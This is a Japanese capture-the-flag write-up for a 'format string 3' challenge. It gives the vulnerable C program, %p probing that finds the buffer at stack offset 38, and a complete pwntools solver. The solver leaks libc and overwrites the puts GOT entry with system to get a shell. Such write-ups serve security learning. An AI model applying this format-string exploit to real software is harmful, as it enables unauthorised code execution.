# format string 3
以下のコードが渡される
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```

明らかにFSAが行える
`printf`で`buf`がスタックの何番目に積まれているのか調べる
```bash
$ ./format-string-3 
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f55235cb3f0
AAAA%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
AAAA0x7f5523729963,0xfbad208b,0x7fffd43b8de0,0x1,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0x252c702541414141,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0xa2c,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),

$ echo 'AAAAAAAA0x7f72f66d6963,0xfbad208b,0x7ffcbe227c30,0x1,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),0x4141414141414141,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0xa2c70252c70,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),' | sed 's/,/\n/g' | grep 41 -n
38:0x4141414141414141
```
`buf`はスタックの38番目に積まれる

## solver
`puts`が`/bin/sh`を引数として受け取っているのでGOT Overwriteで`puts`関数のアドレスを`system`関数に書き換える

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def main():
    io = process([exe.path])
    io.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
    libc_addr = io.recvline()
    libc.address = int(libc_addr, 16) - libc.symbols["setvbuf"]
    print(f"libc base: {hex(libc.address)}")

    payload = fmtstr_payload(
        38, {exe.got["puts"]: libc.symbols["system"]}, write_size="short"
    )

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

以上のソルバーでシェルを奪取できる
